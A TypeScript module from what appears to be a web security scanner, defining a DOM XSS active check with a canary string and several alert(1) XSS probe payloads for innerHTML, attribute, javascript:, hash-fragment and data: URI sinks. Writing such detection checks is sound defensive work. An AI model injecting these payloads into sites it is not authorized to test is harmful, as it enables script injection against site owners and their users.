// DOM XSS active check family (browser-driven).
// Adapted from source-reference/vantix/secops/skills patterns.
// Rewritten in TypeScript with ProxyForge naming and types.
// No runtime dependency on vendored source.

import type { PayloadVariant } from '../types';

export const META = {
  id: 'dom-xss',
  family: 'dom-xss' as const,
  name: 'DOM XSS',
  description: 'Detects DOM-based XSS by injecting canary payloads into URL fragments, query params, and postMessage events.',
  defaultRisk: 'none' as const,
  insertionPointKinds: ['query', 'path'],
};

const DOM_XSS_PROBES = [
  {
    value: 'pf-canary-alert',
    intent: 'Plain canary string to check if value reaches a DOM sink without mutation',
    signals: ['canary-in-dom-sink'], requiresBrowser: true,
  },
  {
    value: '<img src=x onerror=alert(1)>',
    intent: 'HTML injection payload for innerHTML/outerHTML sinks',
    signals: ['dom-xss-executed'], requiresBrowser: true,
  },
  {
    value: 'javascript:alert(1)',
    intent: 'javascript: URI for href/src/action attribute sinks',
    signals: ['dom-xss-executed'], requiresBrowser: true,
  },
  {
    value: '"><svg/onload=alert(1)>',
    intent: 'SVG payload for attribute-context DOM sinks',
    signals: ['dom-xss-executed'], requiresBrowser: true,
  },
  {
    value: '#<img src=x onerror=alert(1)>',
    intent: 'Hash-fragment HTML injection for location.hash sinks',
    signals: ['dom-xss-executed'], requiresBrowser: true,
  },
  {
    value: 'data:text/html,<script>alert(1)</script>',
    intent: 'data: URI for location navigation sinks',
    signals: ['dom-xss-executed'], requiresBrowser: true,
  },
];

export function variants(): PayloadVariant[] {
  return DOM_XSS_PROBES.map((probe, i) => ({
    id: `domxss-${i + 1}`,
    family: 'dom-xss' as const,
    value: probe.value,
    encoding: 'raw' as const,
    intent: probe.intent,
    requiresOast: false,
    requiresBrowser: probe.requiresBrowser,
    destructiveRisk: 'none' as const,
    expectedSignals: probe.signals,
  }));
}
